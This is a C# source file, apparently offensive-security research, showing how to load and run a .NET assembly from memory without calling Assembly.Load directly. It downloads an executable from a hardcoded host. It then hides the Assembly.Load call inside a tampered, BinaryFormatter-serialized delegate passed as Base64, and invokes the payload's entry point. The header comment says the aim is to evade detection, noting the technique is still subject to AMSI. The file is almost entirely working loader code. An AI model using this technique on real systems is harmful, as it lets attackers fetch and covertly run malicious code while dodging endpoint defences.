/** Uses object serialization to create a delegate for Assembly.Load. Passes the delegate as Base64.
 * Deserializes the Base64 into a Delegate and invokes it.
 * Means that you do not directly call Assembly.Load and your Assembly can be passed around in a wrapper format.
 * Still subject to AMSI in v4.8+.
 * 
 * Author: The Wover
 * 
 **/


using System;
using System.Reflection;
//using Newtonsoft.Json;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Collections;

namespace ILGeneratorTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string url = @"http://192.168.254.130:8000/ShellcodeTest.exe";

            System.Net.WebClient client = new System.Net.WebClient();


            byte[] assembly = client.DownloadData(url);
            BinaryFormatter fmt = new BinaryFormatter();
            MemoryStream stm = new MemoryStream();
            fmt.Serialize(stm, BuildLoaderDelegateMscorlib(assembly));

            //Console.WriteLine(JsonConvert.SerializeObject(stm.ToArray()));

            string result = Convert.ToBase64String(stm.ToArray());

            Console.WriteLine(result);

            int length = System.Text.Encoding.ASCII.GetByteCount(result);

            byte[] bytes = System.Text.Encoding.ASCII.GetBytes(result);

            System.Security.Cryptography.FromBase64Transform transform = new System.Security.Cryptography.FromBase64Transform();
            bytes = transform.TransformFinalBlock(bytes, 0, length);

            MemoryStream ms = new MemoryStream();

            ms.Write(bytes, 0, bytes.Length);
            ms.Position = 0;

            BinaryFormatter fmtr = new BinaryFormatter();
            ArrayList ar = new ArrayList();

            Delegate d = (Delegate)fmtr.Deserialize(ms);

            ar.Add(null);

            Assembly res = (Assembly)d.DynamicInvoke(ar.ToArray());

            res.EntryPoint.Invoke(null, new object[] { new string[] { } });

            Console.Read();

        }

        static object BuildLoaderDelegateMscorlib(byte[] assembly)
        {
            Delegate res = Delegate.CreateDelegate(typeof(Converter<byte[], Assembly>),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]), typeof(byte[]) }));

            HeaderHandler d = new HeaderHandler(Convert.ToString);

            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());
            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);

            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = res;
            fi.SetValue(d, invoke_list);

            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[0]);
            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[2]);

            return d;
        }


        //Builds a delegate for our Assembly.
        static object BuildLoaderDelegate(byte[] assembly)
        {
            // Create a bound delegate which will load our assembly from a byte array.
            Delegate res = Delegate.CreateDelegate(typeof(System.Xml.Schema.XmlValueGetter),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }));

            // Create a COM invokable delegate to call the loader. Abuses contra-variance
            // to make an array of headers to an array of objects (which we'll just pass
            // null to anyway).
            return new HeaderHandler(res.DynamicInvoke);
        }
    }
}